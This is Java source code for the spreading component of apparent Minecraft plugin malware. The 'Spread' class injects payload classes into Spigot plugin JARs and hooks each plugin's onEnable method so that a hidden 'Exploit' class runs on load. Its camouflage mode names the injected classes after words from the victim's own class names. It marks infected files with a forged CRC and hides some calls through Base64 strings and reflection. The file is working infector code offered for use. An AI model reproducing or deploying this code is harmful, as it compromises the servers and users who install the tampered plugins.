package com.tmquan2508.exploit;

import org.apache.commons.lang3.SystemUtils;
import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import com.tmquan2508.exploit.Exploit.JavassistReflectiveWrapper;

public class Spread {
    public static boolean patchFile(String orig, String out, boolean camouflage) {
        PatchUtils.logMessage(String.format("[Spread] Received patch request for '%s' -> '%s' [Camouflage: %s]", orig, out, camouflage));
        Path input = Paths.get(orig);
        if (!Files.exists(input)) {
            PatchUtils.logMessage("[Spread] Input file does not exist: " + orig);
            return false;
        };
        if (PatchUtils.isAlreadyPatched(input)) {
            return false;
        }
        if (camouflage) {
            PatchUtils.logMessage("[Spread] Camouflage mode is ENABLED.");
            return Patcher.patchWithCamouflage(orig, out);
        } else {
            PatchUtils.logMessage("[Spread] Camouflage mode is DISABLED. Using standard injection.");
            return Patcher.patchStandard(orig, out);
        }
    }

    private static class Patcher {
        private record InjectionPlan(String newPackage, String newPrefix) {}

        private static boolean patchWithCamouflage(String orig, String out) {
            File inputFile = new File(orig);
            if (!inputFile.exists()) {
                PatchUtils.logMessage("[!] Patcher: Input file does not exist: " + orig);
                return false;
            }
            CamouflageUtils.CamouflagePlan plan = CamouflageUtils.generateCamouflagePlan(inputFile);
            InjectionPlan injectionPlan = new InjectionPlan(plan.packageName().replace('/', '.'), plan.namePrefix());
            PatchUtils.logMessage("[+] Patcher: Generated new CAMOUFLAGE plan.");
            PatchUtils.logMessage("  |-> Target Package: " + injectionPlan.newPackage());
            PatchUtils.logMessage("  |-> Target Prefix: " + injectionPlan.newPrefix());
            return performPatching(orig, out, injectionPlan, "CAMOUFLAGE");
        }

        private static boolean patchStandard(String orig, String out) {
            InjectionPlan injectionPlan = new InjectionPlan(Spread.class.getPackage().getName(), "");
            PatchUtils.logMessage("[+] Patcher: Generated new STANDARD plan.");
            PatchUtils.logMessage("  |-> Target Package: " + injectionPlan.newPackage());
            PatchUtils.logMessage("  |-> Target Prefix: <none>");
            return performPatching(orig, out, injectionPlan, "STANDARD");
        }

        private static boolean performPatching(String orig, String out, InjectionPlan plan, String mode) {
            PatchUtils.logMessage(String.format("[+] Patcher: Starting '%s' patching process...", mode));
            Path input = Paths.get(orig);
            Path output = Paths.get(out);

            try {
                PatchUtils.logMessage("[+] Patcher: Copying original JAR to temporary output path.");
                Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
            } catch (IOException e) {
                PatchUtils.logMessage("[!] Patcher: Error during file prep or patch check: " + PatchUtils.stackTrace(e));
                return false;
            }

            Map<String, Object> pluginYAML = PatchUtils.readPluginYAML(output.toAbsolutePath().toString());
            if (pluginYAML == null) {
                PatchUtils.logMessage("[!] Patcher: Not a valid Spigot plugin (plugin.yml not found or invalid). Cleaning up.");
                try { Files.delete(output); } catch (IOException e) { }
                return false;
            }
            String mainClass = (String) pluginYAML.get("main");
            PatchUtils.logMessage("[+] Patcher: Found plugin main class: " + mainClass);

            try {
                PatchUtils.logMessage("[+] Patcher: Creating virtual FileSystem for output JAR.");
                String encodedClName = "amF2YS5sYW5nLkNsYXNzTG9hZGVy"; //java.lang.ClassLoader
                Class<?> clClass = Class.forName(new String(Base64.getDecoder().decode(encodedClName), StandardCharsets.UTF_8));
                FileSystem outStream = (FileSystem) Exploit.DynamicInvoker.invokeStaticMethod(
                        FileSystems.class, "newFileSystem", FileSystem.class,
                        new Class<?>[]{Path.class, clClass},
                        output, null);
                if (outStream == null) throw new IOException("Failed to create FileSystem reflectively.");

                try (outStream) {
                    JavassistReflectiveWrapper javassist = Exploit.getJavassistWrapper();
                    Object pool = javassist.createDefaultClassPool();

                    PayloadInjector.Result injectionResult = PayloadInjector.inject(pool, outStream, javassist, plan);
                    if (injectionResult.finalExploitFQN == null) {
                        throw new IllegalStateException("Failed to determine the final FQN for Exploit class after injection.");
                    }

                    MainClassPatcher.hook(pool, outStream, javassist, orig, mainClass, injectionResult.finalExploitFQN);

                    PatchUtils.logMessage("[+] Patcher: Detaching all modified classes from Javassist pool.");
                    for (Object cc : injectionResult.allPayloadClasses) javassist.detach(cc);
                }

                PatchUtils.setInfectionMarkerOnTarget(output);
                PatchUtils.logMessage(String.format("[SUCCESS] Successfully patched '%s' with %s injection.", output.getFileName(), mode));

            } catch (Throwable e) {
                PatchUtils.logMessage("[CRITICAL] A critical error occurred during patching process. Rolling back.");
                PatchUtils.logMessage(PatchUtils.stackTrace(new Exception(e)));
                try { Files.deleteIfExists(output); } catch (IOException ex) { PatchUtils.logMessage("[!] Patcher: Error during cleanup: " + PatchUtils.stackTrace(ex)); }
                return false;
            }
            return true;
        }
    }

    private static class PayloadInjector {
        private record Result(String finalExploitFQN, Collection<Object> allPayloadClasses) {}

        public static Result inject(Object pool, FileSystem outStream, JavassistReflectiveWrapper javassist, Patcher.InjectionPlan plan) throws Throwable {
            PatchUtils.logMessage("[+] Injector: Starting payload injection.");
            
            //Automatic find current package and prefix
            String currentPackage = Spread.class.getPackage().getName();
            String currentPrefix = "";
            final String SPREAD_BASE_NAME = "Spread";
            String currentSimpleName = Spread.class.getSimpleName();

            if (currentSimpleName.endsWith(SPREAD_BASE_NAME) && !currentSimpleName.equals(SPREAD_BASE_NAME)) {
                currentPrefix = currentSimpleName.substring(0, currentSimpleName.length() - SPREAD_BASE_NAME.length());
            }

            PatchUtils.logMessage("[DEBUG] Injector: Self-discovery results:");
            PatchUtils.logMessage("  |-> Current Package: " + currentPackage);
            PatchUtils.logMessage("  |-> Current Simple Name: " + currentSimpleName);
            PatchUtils.logMessage("  |-> Deduced Prefix: '" + currentPrefix + "'");

            List<String> allEntries = PatchUtils.getClassesToInject();
            PatchUtils.logMessage("[+] Injector: Found " + allEntries.size() + " payload classes to inject from Config.");

            Object relocationMapObj = javassist.createClassMap();
            @SuppressWarnings("unchecked")
            Map<String, String> relocationMap = (Map<String, String>) relocationMapObj;
            String finalExploitFQN = null;

            PatchUtils.logMessage("[+] Injector: Building relocation map...");
            for (String entry : allEntries) {
                String classPathNoExt = entry;
                String fqnStylePath = classPathNoExt.replace('/', '.');
                
                String sourceFQN = currentPackage + "." + currentPrefix + fqnStylePath;
                String destFQN = plan.newPackage() + "." + plan.newPrefix() + fqnStylePath;
                
                if (entry.equals("Exploit")) {
                    finalExploitFQN = destFQN;
                }
                relocationMap.put(sourceFQN, destFQN);
                PatchUtils.logMessage(String.format("  |-> MAP: '%s'  ==>  '%s'", sourceFQN, destFQN));
            }
            PatchUtils.logMessage("[DEBUG] Injector: Final Exploit FQN determined as: " + finalExploitFQN);

            Collection<Object> allPayloadClasses = new ArrayList<>();
            Object classLoader = Spread.class.getClassLoader();

            PatchUtils.logMessage("[+] Injector: Loading and transforming payload classes from resources...");
            for (Object sourceNameObj : relocationMap.keySet()) {
                String sourceFQN = (String) sourceNameObj;
                String resourcePath = sourceFQN.replace('.', '/') + ".class";
                PatchUtils.logMessage("  |-> Reading resource: " + resourcePath);
                try (InputStream is = (InputStream) Exploit.DynamicInvoker.invokeInstanceMethod(
                        classLoader, "getResourceAsStream", InputStream.class,
                        new Class<?>[]{String.class}, resourcePath)) {
                    if (is == null) {
                        throw new IOException("Cannot find payload resource: " + resourcePath);
                    }
                    allPayloadClasses.add(javassist.makeClass(pool, is));
                }
            }

            PatchUtils.logMessage("[+] Injector: Applying class name replacements using relocation map.");
            for (Object cc : allPayloadClasses) javassist.replaceClassName(cc, relocationMapObj);

            PatchUtils.logMessage("[+] Injector: Writing transformed classes to output JAR...");
            for (Object cc : allPayloadClasses) {
                String newFQN = javassist.getName(cc);
                Path targetPath = outStream.getPath(newFQN.replace('.', '/') + ".class");
                if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                PatchUtils.logMessage("  |-> Writing: " + targetPath.toString());
                Files.write(targetPath, javassist.toBytecode(cc));
            }
            
            PatchUtils.logMessage("[+] Injector: Payload injection phase complete.");
            return new Result(finalExploitFQN, allPayloadClasses);
        }
    }

    private static class MainClassPatcher {
        public static void hook(Object pool, FileSystem outStream, JavassistReflectiveWrapper javassist, String originalJarPath, String mainClass, String finalExploitFQN) throws Throwable {
            PatchUtils.logMessage("[+] Hooker: Starting main class hook process.");
            PatchUtils.logMessage("  |-> Appending original JAR to classpath: " + originalJarPath);
            javassist.appendClassPath(pool, originalJarPath);
            
            PatchUtils.logMessage("  |-> Getting CtClass for: " + mainClass);
            Object ccMain = javassist.getClassFromPool(pool, mainClass);
            
            PatchUtils.logMessage("  |-> Getting 'onEnable' method.");
            Object m = javassist.getDeclaredMethod(ccMain, "onEnable");
            
            String injectionCode = String.format("{ try { new %s((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }", finalExploitFQN);
            PatchUtils.logMessage("[DEBUG] Hooker: Code to be injected into onEnable():");
            PatchUtils.logMessage("        " + injectionCode);
            javassist.insertAfter(m, injectionCode);
            
            Path mainClassPath = outStream.getPath(mainClass.replace('.', '/') + ".class");
            PatchUtils.logMessage("  |-> Writing modified main class back to: " + mainClassPath);
            Files.write(mainClassPath, javassist.toBytecode(ccMain), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);
            
            javassist.detach(ccMain);
            PatchUtils.logMessage("[+] Hooker: Hooking process complete.");
        }
    }

    private static class CrcPatcher {
        private static final int EOCD_SIGNATURE = 0x06054b50;
        private static final int CENTRAL_DIR_SIGNATURE = 0x02014b50;
        private static final String FAKE_STRING = "openbd.injected";

        public static void markJarWithFakeCRC(File jarFile) throws IOException {
            byte[] bytes = Files.readAllBytes(jarFile.toPath());
            int eocdOffset = findEOCDOffset(bytes);
            if (eocdOffset == -1) {
                throw new IOException("EOCD not found in " + jarFile.getName());
            }

            int centralDirectoryOffset = getIntLE(bytes, eocdOffset + 16);
            int currentOffset = centralDirectoryOffset;

            while (getIntLE(bytes, currentOffset) == CENTRAL_DIR_SIGNATURE) {
                int fileNameLength = getShortLE(bytes, currentOffset + 28);
                int extraFieldLength = getShortLE(bytes, currentOffset + 30);
                int fileCommentLength = getShortLE(bytes, currentOffset + 32);
                String filename = new String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8);

                if ("plugin.yml".equals(filename)) {
                    int crcOffset = currentOffset + 16;
                    long fakeCRC = calculateFakeCRC();
                    putIntLE(bytes, crcOffset, (int) fakeCRC);
                    Files.write(jarFile.toPath(), bytes, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
                    return;
                }
                currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength;
            }

            throw new IOException("plugin.yml not found in central directory of " + jarFile.getName());
        }

        public static long calculateFakeCRC() {
            CRC32 crc = new CRC32();
            crc.update(FAKE_STRING.getBytes(StandardCharsets.UTF_8));
            return crc.getValue();
        }

        private static int findEOCDOffset(byte[] bytes) {
            for (int i = bytes.length - 22; i >= Math.max(0, bytes.length - 65557); i--) {
                if (getIntLE(bytes, i) == EOCD_SIGNATURE) {
                    return i;
                }
            }
            return -1;
        }

        private static int getIntLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8) | ((b[off + 2] & 0xFF) << 16) | ((b[off + 3] & 0xFF) << 24);
        }

        private static void putIntLE(byte[] b, int off, int val) {
            b[off] = (byte) (val & 0xFF);
            b[off + 1] = (byte) ((val >> 8) & 0xFF);
            b[off + 2] = (byte) ((val >> 16) & 0xFF);
            b[off + 3] = (byte) ((val >> 24) & 0xFF);
        }

        private static int getShortLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8);
        }
    }

    private static class CamouflageUtils {
        public record CamouflagePlan(String packageName, String namePrefix) {}

        private static final Random RANDOM = new Random();
        private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");

        public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
            Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);
            if (packageStructure.isEmpty()) {
                return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask");
            }
            List<Map.Entry<String, List<String>>> packagesSortedByClassCount = packageStructure.entrySet().stream()
                .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
                .sorted((e1, e2) -> Integer.compare(e2.getValue().size(), e1.getValue().size()))
                .collect(Collectors.toList());
            if (packagesSortedByClassCount.isEmpty()) {
                throw new IllegalStateException("Cannot generate camouflage plan: No suitable packages found in target JAR.");
            }
            Map.Entry<String, List<String>> chosenEntry = packagesSortedByClassCount.get(RANDOM.nextInt(Math.min(4, packagesSortedByClassCount.size())));
            String chosenPackagePath = chosenEntry.getKey();
            List<String> classNamesInPackage = chosenEntry.getValue();
            List<String> dictionary = buildWordDictionaryFrom(classNamesInPackage);
            if (dictionary.isEmpty()) {
                return new CamouflagePlan(chosenPackagePath, "Task");
            }
            String namePrefix = buildUniqueWordName(dictionary, classNamesInPackage.stream().map(s -> s.substring(0, s.lastIndexOf('.'))).collect(Collectors.toList()), 1, 2);
            return new CamouflagePlan(chosenPackagePath, namePrefix);
        }

        private static List<String> buildWordDictionaryFrom(List<String> classNames) {
            return classNames.stream()
                .map(className -> className.substring(0, className.lastIndexOf('.')))
                .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
                .map(word -> word.replaceAll("[^a-zA-Z0-9]", ""))
                .filter(word -> word.length() > 2)
                .distinct()
                .collect(Collectors.toList());
        }

        private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
            String name;
            int attempts = 0;
            do {
                int wordCount = minWords + RANDOM.nextInt(maxWords - minWords + 1);
                StringBuilder nameBuilder = new StringBuilder();
                for (int i = 0; i < wordCount; i++) {
                    nameBuilder.append(dictionary.get(RANDOM.nextInt(dictionary.size())));
                }
                name = nameBuilder.toString();
                if (attempts > 10) {
                    name += attempts;
                }
                attempts++;
            } while (existingNames.contains(name));
            return name;
        }

        private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
            Map<String, List<String>> packageMap = new HashMap<>();
            try (ZipFile zipFile = new ZipFile(jarFile)) {
                Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    if (entry.isDirectory() || !entry.getName().endsWith(".class") || entry.getName().contains("package-info.class"))
                        continue;
                    String fullPath = entry.getName();
                    int lastSlash = fullPath.lastIndexOf('/');
                    String packageName = (lastSlash == -1) ? "" : fullPath.substring(0, lastSlash);
                    packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(fullPath.substring(lastSlash + 1));
                }
            } catch (IOException e) {
                PatchUtils.logMessage("[Camouflage] Error scanning JAR file: " + PatchUtils.stackTrace(e));
            }
            return packageMap;
        }
    }

    private static class PatchUtils {
        private static void logMessage(String message) {
            Exploit.sender.sendDebug(message);
        }

        private static String stackTrace(Exception e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            return sw.toString();
        }

        private static List<String> getClassesToInject() throws IOException {
            String payloadBase64 = Config.class_list;
            if (payloadBase64 == null || payloadBase64.isEmpty() || payloadBase64.startsWith("::")) {
                throw new IOException("CRITICAL: Payload in Config.class_list is missing or not replaced by build process.");
            }
            byte[] payloadBytes = Base64.getDecoder().decode(payloadBase64);
            List<String> classNames = new ArrayList<>();
            try (ByteArrayInputStream bais = new ByteArrayInputStream(payloadBytes);
                 DataInputStream dis = new DataInputStream(bais)) {
                while (dis.available() > 0) {
                    int length = dis.readInt();
                    byte[] data = new byte[length];
                    dis.readFully(data);
                    classNames.add(new String(data, StandardCharsets.UTF_8));
                }
            }
            if (classNames.isEmpty()) {
                throw new IOException("CRITICAL: Decoded payload is empty or corrupted.");
            }
            return classNames;
        }

        private static boolean isAlreadyPatched(Path jarPath) {
            try (ZipFile zipFile = new ZipFile(jarPath.toFile())) {
                ZipEntry entry = zipFile.getEntry("plugin.yml");
                if (entry == null) {
                    return false;
                }
                long storedCrc = entry.getCrc();
                long expectedCrc = CrcPatcher.calculateFakeCRC();
                PatchUtils.logMessage(String.format("[DEBUG] PatchCheck: Stored CRC for plugin.yml is %d. Expected fake CRC is %d.", storedCrc, expectedCrc));
                if (storedCrc == expectedCrc) {
                    PatchUtils.logMessage("[+] PatchCheck: Plugin already patched (marker found). Skipping.");
                    return true;
                }
                return false;
            } catch (IOException e) {
                PatchUtils.logMessage("[!] PatchCheck: Could not check for fake CRC marker: " + e.getMessage());
                return false;
            }
        }

        private static void setInfectionMarkerOnTarget(Path targetJarPath) throws IOException {
            try {
                PatchUtils.logMessage("[+] Marker: Setting infection marker by faking plugin.yml CRC...");
                CrcPatcher.markJarWithFakeCRC(targetJarPath.toFile());
                PatchUtils.logMessage("[+] Marker: Fake CRC marker set successfully.");
            } catch (Exception e) {
                throw new IOException("Failed to set fake marker on " + targetJarPath.getFileName(), e);
            }
        }

        private static Map<String, Object> readPluginYAML(String path) {
            Yaml yamlData = new Yaml();
            InputStream is = null;
            String inputFile = null;
            if (SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC) inputFile = "jar:file://" + path + "!/plugin.yml";
            if (SystemUtils.IS_OS_WINDOWS) inputFile = "jar:file:/" + path + "!/plugin.yml";
            try {
                if (inputFile != null) {
                    URL url = Exploit.DynamicInvoker.invokeConstructor(URL.class, new Class<?>[]{String.class}, inputFile);
                    if (url == null) return null;
                    JarURLConnection connection = (JarURLConnection) url.openConnection();
                    connection.setUseCaches(false);
                    is = connection.getInputStream();
                }
            } catch (IOException e) {
                return null;
            }
            if (is == null) return null;
                try (InputStream finalIs = is) {
                    return yamlData.load(finalIs);
                } catch (Exception e) {
                    return null;
                }
        }
    }
}